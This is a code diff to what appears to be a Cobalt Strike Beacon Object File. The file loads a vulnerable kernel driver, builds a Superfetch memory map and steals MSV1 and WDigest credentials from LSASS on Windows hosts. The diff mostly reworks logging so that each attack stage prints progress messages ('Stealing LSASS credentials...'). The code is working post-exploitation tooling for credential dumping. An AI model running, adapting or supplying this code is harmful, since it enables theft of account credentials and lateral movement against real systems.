@@ -112,17 +112,17 @@ int go(char *args, int argLen)
     HANDLE hFile = CreateFileW(prov_info->device_name, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE)
     {
-        BeaconFormatPrintf(&outputbuffer, "[!] Failed to get handle to vulnerable driver!\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to get handle to vulnerable driver! Error: 0x%lx\n", GetLastError());
 
         if (!removeService())
         {
-            BeaconFormatPrintf(&outputbuffer, "[!] Failed to remove driver service!\n");
+            BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to remove driver service!\n");
         }
 
-        BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&outputbuffer, NULL));
         BeaconFormatFree(&outputbuffer);
         return FALSE;
     }
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Got handle to driver device.\n");
 
 
     // Check which Superfetch version to use based on build number
@@ -131,40 +131,43 @@ int go(char *args, int argLen)
     if (NT_BUILD_NUMBER < KULL_M_WIN_BUILD_10_1803)  // https://www.unknowncheats.me/forum/general-programming-and-reversing/397104-ntquerysysteminformation-systemsuperfetchinformation.html
         use_PF_MEMORYRANGEINFO_V2 = FALSE;
 
-        
+
     // Create Superfetch Database
+    BeaconPrintf(CALLBACK_OUTPUT, "[*] Creating Superfetch database...\n");
     if (!CreateGlobalSuperfetchDatabase(use_PF_MEMORYRANGEINFO_V2))
     {
+        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to create Superfetch database!\n");
+
         if (!removeService())
         {
-            BeaconFormatPrintf(&outputbuffer, "[!] Failed to remove driver service!\n");
+            BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to remove driver service!\n");
         }
 
-        BeaconFormatPrintf(&outputbuffer, "[+] Closing handle to vulnerable driver\n");
         CloseHandle(hFile);
-
-        BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&outputbuffer, NULL));
         BeaconFormatFree(&outputbuffer);
         return FALSE;
     }
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Superfetch database created.\n");
 
 
+    BeaconPrintf(CALLBACK_OUTPUT, "[*] Stealing LSASS credentials...\n");
     if (!StealLSASSCredentials(hFile, NT_BUILD_NUMBER, RetrieveMSV1Credentials, RetrieveWDigestCredentials))
     {
-        BeaconFormatPrintf(&outputbuffer, "[!] Failed to retrieve LSASS credentials!\n\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to retrieve LSASS credentials!\n");
     }
 
 
-    BeaconFormatPrintf(&outputbuffer, "[+] Closing handle to vulnerable driver\n");
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Closing handle to vulnerable driver.\n");
     CloseHandle(hFile);
-    
+
     // Stop and delete service
     if (!removeService())
     {
-        BeaconFormatPrintf(&outputbuffer, "[!] Failed to remove driver service!\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to remove driver service!\n");
     }
 
-    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&outputbuffer, NULL));
+    char* bufOut = BeaconFormatToString(&outputbuffer, NULL);
+    if (bufOut) BeaconPrintf(CALLBACK_OUTPUT, "%s", bufOut);
     BeaconFormatFree(&outputbuffer);
     
     return 0;
